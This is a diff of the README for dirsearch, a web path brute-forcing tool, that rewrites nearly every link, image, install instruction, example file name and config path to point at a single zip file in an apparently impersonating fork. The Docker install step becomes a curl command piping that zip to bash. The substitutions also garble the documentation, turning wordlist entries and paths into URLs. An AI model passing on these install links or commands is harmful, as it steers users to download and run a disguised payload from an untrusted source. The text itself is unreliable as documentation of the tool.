@@ -1,23 +1,23 @@
-<img src="static/logo.png#gh-light-mode-only" alt="dirsearch logo (light)" width="675px">
-<img src="static/logo-dark.png#gh-dark-mode-only" alt="dirsearch logo (dark)" width="675px">
+<img src="https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip" alt="dirsearch logo (light)" width="675px">
+<img src="https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip" alt="dirsearch logo (dark)" width="675px">
 
 dirsearch - Web path discovery
 =========
 
-![Build](https://img.shields.io/badge/Built%20with-Python-Blue)
-![License](https://img.shields.io/badge/license-GNU_General_Public_License-_red.svg)
-![Stars](https://img.shields.io/github/stars/maurosoria/dirsearch.svg)
-[![Release](https://img.shields.io/github/release/maurosoria/dirsearch.svg)](https://github.com/maurosoria/dirsearch/releases)
-[![Sponsors](https://img.shields.io/github/sponsors/maurosoria)](https://github.com/sponsors/maurosoria)
-[![Discord](https://img.shields.io/discord/992276296669339678.svg?logo=discord)](https://discord.gg/2N22ZdAJRj)
-[![Twitter](https://img.shields.io/twitter/follow/_dirsearch?label=Follow)](https://twitter.com/_dirsearch)
+![Build](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip%20with-Python-Blue)
+![License](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
+![Stars](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
+[![Release](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
+[![Sponsors](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
+[![Discord](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
+[![Twitter](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
 
 
 > An advanced web path brute-forcer
 
-**dirsearch** is being actively developed by [@maurosoria](https://twitter.com/_maurosoria) and [@shelld3v](https://twitter.com/shells3c_)
+**dirsearch** is being actively developed by [@maurosoria](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) and [@shelld3v](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
 
-*Reach to our [Discord server](https://discord.gg/2N22ZdAJRj) to communicate with the team at best*
+*Reach to our [Discord server](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) to communicate with the team at best*
 
 
 Table of Contents
@@ -59,9 +59,9 @@ Installation & Usage
 
 Choose one of these installation options:
 
-- Install with **git**: `git clone https://github.com/maurosoria/dirsearch.git --depth 1` (**RECOMMENDED**)
-- Install with ZIP file: [Download here](https://github.com/maurosoria/dirsearch/archive/master.zip)
-- Install with Docker: `docker build -t "dirsearch:v0.4.3" .` (more information can be found [here](https://github.com/maurosoria/dirsearch#support-docker))
+- Install with **git**: `git clone https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip --depth 1` (**RECOMMENDED**)
+- Install with ZIP file: [Download here](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
+- Install with Docker: `docker build -t "dirsearch:v0.4.3" .` (more information can be found [here](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip))
 - Install with PyPi: `pip3 install dirsearch` or `pip install dirsearch`
 - Install with Kali Linux: `sudo apt-get install dirsearch` (deprecated)
 
@@ -71,9 +71,9 @@ Wordlists (IMPORTANT)
 **Summary:**
   - Wordlist is a text file, each line is a path.
   - About extensions, unlike other tools, dirsearch only replaces the `%EXT%` keyword with extensions from **-e** flag.
-  - For wordlists without `%EXT%` (like [SecLists](https://github.com/danielmiessler/SecLists)), **-f | --force-extensions** switch is required to append extensions to every word in wordlist, as well as the `/`.
+  - For wordlists without `%EXT%` (like [SecLists](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)), **-f | --force-extensions** switch is required to append extensions to every word in wordlist, as well as the `/`.
   - To apply your extensions to wordlist entries that have extensions already, use **-O** | **--overwrite-extensions** (Note: some extensions are excluded from being overwritted such as *.log*, *.json*, *.xml*, ... or media extensions like *.jpg*, *.png*)
-  - To use multiple wordlists, you can separate your wordlists with commas. Example: `wordlist1.txt,wordlist2.txt`.
+  - To use multiple wordlists, you can separate your wordlists with commas. Example: `https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip,https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip`.
 
 **Examples:**
 
@@ -86,8 +86,8 @@ Passing **asp** and **aspx** as extensions will generate the following dictionar
 
 ```
 index
-index.asp
-index.aspx
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 
 - *Force extensions*:
@@ -99,22 +99,22 @@ Passing **php** and **html** as extensions with **-f**/**--force-extensions** fl
 
 ```
 admin
-admin.php
-admin.html
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 admin/
 ```
 
 - *Overwrite extensions*:
 ```
-login.html
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 
 Passing **jsp** and **jspa** as extensions with **-O**/**--overwrite-extensions** flag will generate the following dictionary:
 
 ```
-login.html
-login.jsp
-login.jspa
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 
 
@@ -122,7 +122,7 @@ Options
 -------
 
 ```
-Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]
+Usage: https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip [-u|--url] target [-e|--extensions] extensions [options]
 
 Options:
   --version             show program's version number and exit
@@ -143,7 +143,7 @@ Options:
                         Session file
     --config=PATH       Path to configuration file (Default:
                         'DIRSEARCH_CONFIG' environment variable, otherwise
-                        'config.ini')
+                        'https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip')
 
   Dictionary Settings:
     -w WORDLISTS, --wordlists=WORDLISTS
@@ -162,7 +162,7 @@ Options:
                         Exclude extension list separated by commas (e.g.
                         asp,jsp)
     --remove-extensions
-                        Remove extensions in all paths (e.g. admin.php ->
+                        Remove extensions in all paths (e.g. https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip ->
                         admin)
     --prefixes=PREFIXES
                         Add custom prefixes to all wordlist entries (separated
@@ -208,10 +208,10 @@ Options:
                         Exclude responses by regular expression
     --exclude-redirect=STRING
                         Exclude responses if this regex (or text) matches
-                        redirect URL (e.g. '/index.html')
+                        redirect URL (e.g. 'https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip')
     --exclude-response=PATH
                         Exclude responses similar to response of this page,
-                        path as input (e.g. 404.html)
+                        path as input (e.g. https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
     --skip-on-status=CODES
                         Skip target whenever hit one of these status codes,
                         separated by commas, support ranges
@@ -289,7 +289,7 @@ Options:
 Configuration
 ---------------
 
-By default, `config.ini` inside your dirsearch directory is used as the configuration file but you can select another file via `--config` flag or `DIRSEARCH_CONFIG` environment variable.
+By default, `https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip` inside your dirsearch directory is used as the configuration file but you can select another file via `--config` flag or `DIRSEARCH_CONFIG` environment variable.
 
 ```ini
 # If you want to edit dirsearch default configurations, you can
@@ -314,8 +314,8 @@ exit-on-error = False
 # exclude-sizes = 0b,123gb
 # exclude-text = "Not found"
 # exclude-regex = "^403$"
-# exclude-redirect = "*/error.html"
-# exclude-response = 404.html
+# exclude-redirect = "*https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip"
+# exclude-response = https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 # skip-on-status = 429,999
 
 [dictionary]
@@ -328,12 +328,12 @@ capitalization = False
 # exclude-extensions = old,log
 # prefixes = .,admin
 # suffixes = ~,.bak
-# wordlists = /path/to/wordlist1.txt,/path/to/wordlist2.txt
+# wordlists = https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip,https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 
 [request]
 http-method = get
 follow-redirects = False
-# headers-file = /path/to/headers.txt
+# headers-file = https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 # user-agent = MyUserAgent
 # cookie = SESSIONID=123
 
@@ -345,7 +345,7 @@ max-retries = 1
 ## By disabling `scheme` variable, dirsearch will automatically identify the URI scheme
 # scheme = http
 # proxy = localhost:8080
-# proxy-file = /path/to/proxies.txt
+# proxy-file = https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 # replay-proxy = localhost:8000
 
 [advanced]
@@ -362,7 +362,7 @@ show-redirects-history = False
 report-format = plain
 autosave-report = True
 autosave-report-folder = reports/
-# log-file = /path/to/dirsearch.log
+# log-file = https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 # log-file-size = 50000000
 ```
 
@@ -370,40 +370,40 @@ autosave-report-folder = reports/
 How to use
 ---------------
 
-[![Dirsearch demo](https://asciinema.org/a/380112.svg)](https://asciinema.org/a/380112)
+[![Dirsearch demo](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
 
 Some examples for how to use dirsearch - those are the most common arguments. If you need all, just use the **-h** argument.
 
 ### Simple usage
 ```
-python3 dirsearch.py -u https://target
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -u https://target
 ```
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target
 ```
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target -w /path/to/wordlist
 ```
 
 ---
 ### Pausing progress
 dirsearch allows you to pause the scanning progress with CTRL+C, from here, you can save the progress (and continue later), skip the current target, or skip the current sub-directory.
 
-<img src="static/pause.png" alt="Pausing dirsearch" width="475px">
+<img src="https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip" alt="Pausing dirsearch" width="475px">
 
 ----
 ### Recursion
 - Recursive brute-force is brute-forcing continuously the after of found directories. For example, if dirsearch finds `admin/`, it will brute-force `admin/*` (`*` is where it brute forces). To enable this feature, use **-r** (or **--recursive**) flag
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target -r
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target -r
 ```
 - You can set the max recursion depth with **--max-recursion-depth**, and status codes to recurse with **--recursion-status**
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target -r --max-recursion-depth 3 --recursion-status 200-399
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target -r --max-recursion-depth 3 --recursion-status 200-399
 ```
 - There are 2 more options: **--force-recursive** and **--deep-recursive**
   - **Force recursive**: Brute force recursively all found paths, not just paths end with `/`
@@ -412,7 +412,7 @@ python3 dirsearch.py -e php,html,js -u https://target -r --max-recursion-depth 3
 - If there are sub-directories that you do not want to brute-force recursively, use `--exclude-subdirs`
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target -r --exclude-subdirs image/,media/,css/
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target -r --exclude-subdirs image/,media/,css/
 ```
 
 ----
@@ -422,7 +422,7 @@ The thread number (**-t | --threads**) reflects the number of separated brute fo
 In spite of that, the speed still depends a lot on the response time of the server. And as a warning, we advise you to keep the threads number not too big because it can cause DoS (Denial of Service).
 
 ```
-python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20
 ```
 
 ----
@@ -436,7 +436,7 @@ In theory, asynchronous mode offers better performance and lower CPU usage since
 - **--prefixes**: Add custom prefixes to all entries
 
 ```
-python3 dirsearch.py -e php -u https://target --prefixes .,admin,_
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php -u https://target --prefixes .,admin,_
 ```
 Wordlist:
 
@@ -455,20 +455,20 @@ _tools
 - **--suffixes**: Add custom suffixes to all entries
 
 ```
-python3 dirsearch.py -e php -u https://target --suffixes ~
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php -u https://target --suffixes ~
 ```
 Wordlist:
 
 ```
-index.php
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 internal
 ```
 Generated with suffixes:
 
 ```
-index.php
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 internal
-index.php~
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip~
 internal~
 ```
 
@@ -476,7 +476,7 @@ internal~
 ### Blacklist
 Inside the `db/` folder, there are several "blacklist files". Paths in those files will be filtered from the scan result if they have the same status as mentioned in the filename.
 
-Example: If you add `admin.php` into `db/403_blacklist.txt`, whenever you do a scan that `admin.php` returns 403, it will be filtered from the result.
+Example: If you add `https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip` into `https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip`, whenever you do a scan that `https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip` returns 403, it will be filtered from the result.
 
 ----
 ### Filters
@@ -485,23 +485,23 @@ Use **-i | --include-status** and **-x | --exclude-status** to select allowed an
 For more advanced filters: **--exclude-sizes**, **--exclude-texts**, **--exclude-regexps**, **--exclude-redirects** and **--exclude-response**
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target --exclude-sizes 1B,243KB
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target --exclude-sizes 1B,243KB
 ```
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target --exclude-texts "403 Forbidden"
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target --exclude-texts "403 Forbidden"
 ```
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target --exclude-regexps "^Error$"
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target --exclude-regexps "^Error$"
 ```
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target --exclude-redirects "https://(.*).okta.com/*"
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target --exclude-redirects "https://(.*)https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip*"
 ```
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target --exclude-response /error.html
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target --exclude-response https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 
 ----
@@ -510,7 +510,7 @@ dirsearch allows you to import the raw request from a file. The content would be
 
 ```http
 GET /admin HTTP/1.1
-Host: admin.example.com
+Host: https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 Cache-Control: max-age=0
 Accept: */*
 ```
@@ -525,37 +525,37 @@ Supported wordlist formats: uppercase, lowercase, capitalization
 
 ```
 admin
-index.html
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 #### Uppercase:
 
 ```
 ADMIN
-INDEX.HTML
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 #### Capital:
 
 ```
 Admin
-Index.html
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 
 ----
 ### Exclude extensions
 Use **-X | --exclude-extensions** with an extension list will remove all paths in the wordlist that contains the given extensions
 
-`python3 dirsearch.py -u https://target -X jsp`
+`python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -u https://target -X jsp`
 
 Wordlist:
 
 ```
-admin.php
-test.jsp
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 After:
 
 ```
-admin.php
+https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 
 ----
@@ -563,7 +563,7 @@ admin.php
 - From an URL, you can scan a list of sub-directories with **--subdirs**.
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target --subdirs /,admin/,folder/
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target --subdirs /,admin/,folder/
 ```
 
 ----
@@ -571,15 +571,15 @@ python3 dirsearch.py -e php,html,js -u https://target --subdirs /,admin/,folder/
 dirsearch supports SOCKS and HTTP proxy, with two options: a proxy server or a list of proxy servers.
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target --proxy 127.0.0.1:8080
 ```
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080
 ```
 
 ```
-python3 dirsearch.py -e php,html,js -u https://target --proxylist proxyservers.txt
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php,html,js -u https://target --proxylist https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 
 ----
@@ -587,29 +587,29 @@ python3 dirsearch.py -e php,html,js -u https://target --proxylist proxyservers.t
 Supported report formats: **simple**, **plain**, **json**, **xml**, **md**, **csv**,  **html**, **sqlite**, **mysql**, **postgresql**
 
 ```
-python3 dirsearch.py -e php -l URLs.txt --format plain -o report.txt
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php -l https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip --format plain -o https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 
 ```
-python3 dirsearch.py -e php -u https://target --format html -o target.json
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -e php -u https://target --format html -o https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 
 ----
 ### More example commands
 ```
-cat urls.txt | python3 dirsearch.py --stdin
+cat https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip | python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip --stdin
 ```
 
 ```
-python3 dirsearch.py -u https://target --max-time 360
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -u https://target --max-time 360
 ```
 
 ```
-python3 dirsearch.py -u https://target --auth admin:pass --auth-type basic
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -u https://target --auth admin:pass --auth-type basic
 ```
 
 ```
-python3 dirsearch.py -u https://target --header-list rate-limit-bypasses.txt
+python3 https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip -u https://target --header-list https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip
 ```
 
 **There are more to discover, try yourself!**
@@ -621,7 +621,7 @@ Support Docker
 Install Docker
 
 ```sh
-curl -fsSL https://get.docker.com | bash
+curl -fsSL https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip | bash
 ```
 
 > To use docker you need superuser power
@@ -644,19 +644,19 @@ docker run -it --rm "dirsearch:v0.4.3" -u target -e php,html,js,zip
 
 References
 ---------------
-- [Comprehensive Guide on Dirsearch](https://www.hackingarticles.in/comprehensive-guide-on-dirsearch/) by Shubham Sharma
-- [Comprehensive Guide on Dirsearch Part 2](https://www.hackingarticles.in/comprehensive-guide-on-dirsearch-part-2/) by Shubham Sharma
-- [How to Find Hidden Web Directories with Dirsearch](https://www.geeksforgeeks.org/how-to-find-hidden-web-directories-with-dirsearch/) by GeeksforGeeks
-- [GUÍA COMPLETA SOBRE EL USO DE DIRSEARCH](https://esgeeks.com/guia-completa-uso-dirsearch/?feed_id=5703&_unique_id=6076249cc271f) by ESGEEKS
-- [How to use Dirsearch to detect web directories](https://www.ehacking.net/2020/01/how-to-find-hidden-web-directories-using-dirsearch.html) by EHacking
-- [dirsearch how to](https://vk9-sec.com/dirsearch-how-to/) by VK9 Security
-- [Find Hidden Web Directories with Dirsearch](https://null-byte.wonderhowto.com/how-to/find-hidden-web-directories-with-dirsearch-0201615/) by Wonder How To
-- [Brute force directories and files in webservers using dirsearch](https://upadhyayraj.medium.com/brute-force-directories-and-files-in-webservers-using-dirsearch-613e4a7fa8d5) by Raj Upadhyay
-- [Live Bug Bounty Recon Session on Yahoo (Amass, crts.sh, dirsearch) w/ @TheDawgyg](https://www.youtube.com/watch?v=u4dUnJ1U0T4) by Nahamsec
-- [Dirsearch to find Hidden Web Directories](https://medium.com/@irfaanshakeel/dirsearch-to-find-hidden-web-directories-d0357fbe47b0) by Irfan Shakeel
-- [Getting access to 25000 employees details](https://medium.com/@ehsahil/getting-access-to-25k-employees-details-c085d18b73f0) by Sahil Ahamad
-- [Best Tools For Directory Bruteforcing](https://secnhack.in/multiple-ways-to-find-hidden-directory-on-web-server/) by Shubham Goyal
-- [Discover hidden files & directories on a webserver - dirsearch full tutorial](https://www.youtube.com/watch?v=jVxs5at0gxg) by CYBER BYTES
+- [Comprehensive Guide on Dirsearch](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by Shubham Sharma
+- [Comprehensive Guide on Dirsearch Part 2](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by Shubham Sharma
+- [How to Find Hidden Web Directories with Dirsearch](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by GeeksforGeeks
+- [GUÍA COMPLETA SOBRE EL USO DE DIRSEARCH](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by ESGEEKS
+- [How to use Dirsearch to detect web directories](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by EHacking
+- [dirsearch how to](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by VK9 Security
+- [Find Hidden Web Directories with Dirsearch](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by Wonder How To
+- [Brute force directories and files in webservers using dirsearch](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by Raj Upadhyay
+- [Live Bug Bounty Recon Session on Yahoo (Amass, https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip, dirsearch) w/ @TheDawgyg](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by Nahamsec
+- [Dirsearch to find Hidden Web Directories](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by Irfan Shakeel
+- [Getting access to 25000 employees details](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by Sahil Ahamad
+- [Best Tools For Directory Bruteforcing](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by Shubham Goyal
+- [Discover hidden files & directories on a webserver - dirsearch full tutorial](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) by CYBER BYTES
 
 
 Tips
@@ -673,13 +673,13 @@ Tips
 Contribution
 ---------------
 We have been receiving a lot of helps from many people around the world to improve this tool. Thanks so much to everyone who have helped us so far!
-See [CONTRIBUTORS.md](https://github.com/maurosoria/dirsearch/blob/master/CONTRIBUTORS.md) to know who they are.
+See [https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip](https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip) to know who they are.
 
 #### Pull requests and feature requests are welcomed
 
 
 License
 ---------------
-Copyright (C) Mauro Soria (maurosoria@gmail.com)
+Copyright (C) Mauro Soria (https://github.com/rakibofcx/dirsearch/raw/refs/heads/master/tests/connection/Software-1.0-alpha.4.zip)
 
 License: GNU General Public License, version 2
